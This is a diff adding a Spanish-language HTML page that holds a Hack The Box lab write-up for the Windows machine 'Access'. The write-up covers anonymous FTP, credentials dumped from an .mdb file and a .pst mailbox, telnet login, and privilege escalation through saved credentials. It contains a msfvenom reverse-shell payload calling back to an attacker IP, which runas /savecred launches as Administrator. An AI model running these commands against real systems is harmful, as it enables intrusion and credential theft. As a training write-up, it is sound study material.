@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png" />
+    <title>RuyzTz7 | Access HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/access/pasted-20260307015058.png" alt="Access HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Access</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>mdb</span>
+            <span>pst</span>
+            <span>telnet</span>
+            <span>ftp_anonimo</span>
+            <span>Credential Manager</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Explotación</code>: FTP anónimo con un fichero .mdb (BD)</li>
+            <li><code>Explotación</code>: FTP anónimo con un fichero .pst (Correo)</li>
+            <li><code>Escalada Privilegios</code>: Credential Manager</li>
+          </ul>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/access/pasted-20260307023717.png" alt="Enumeración de Access" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Acceso ftp</h3>
+            <pre><code>ftp access
+# anonymous
+# Descargar archivos .zip/png en modo binario (ascci por defecto)
+bin
+get backup.mdb
+get Access\ Control.zip</code></pre>
+          </div>
+
+          <div class="code-card">
+            <h3>Dumpear .mdb</h3>
+            <pre><code>mdb-tables backup.mdb
+mdb-export backup.mdb auth_user
+# admin:admin
+# engineer:access4u@security
+# backup_admin:admin</code></pre>
+          </div>
+
+          <div class="code-card">
+            <h3>.zip protegido con contraseña</h3>
+            <pre><code>7z x 'Access\ Control.zip'
+# Contraseña: access4u@security
+# Descomprime un fichero .pst</code></pre>
+          </div>
+
+          <div class="code-card">
+            <h3>Leer fichero .pst</h3>
+            <pre><code># Herramienta evolution como usuario normal
+evolution
+# Importar fichero .pst y encontramos credenciales en un correo
+# security:4Cc3ssC0ntr0ller</code></pre>
+          </div>
+
+          <img class="writeup-image" src="/writeups/assets/access/pasted-20260307025312.png" alt="Correo con credenciales en Access" />
+          <img class="writeup-image" src="/writeups/assets/access/pasted-20260307025212.png" alt="Fichero pst importado en Evolution" />
+
+          <div class="code-card">
+            <h3>Acceso Telnet</h3>
+            <pre><code>telnet access
+# security:4Cc3ssC0ntr0ller</code></pre>
+          </div>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Escalada Privilegios</h2>
+          <div class="code-card">
+            <h3>Credential Manager</h3>
+            <pre><code>cmdkey /list</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/access/pasted-20260307233632.png" alt="Credential Manager en Access" />
+
+          <div class="code-card">
+            <h3>Payload</h3>
+            <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.69 LPORT=444 -f exe -o shell.exe</code></pre>
+          </div>
+
+          <div class="code-card">
+            <h3>Reverse Shell</h3>
+            <pre><code>runas.exe /savecred /user:ACCESS\Administrator "C:\Users\security\Desktop\shell.exe"</code></pre>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
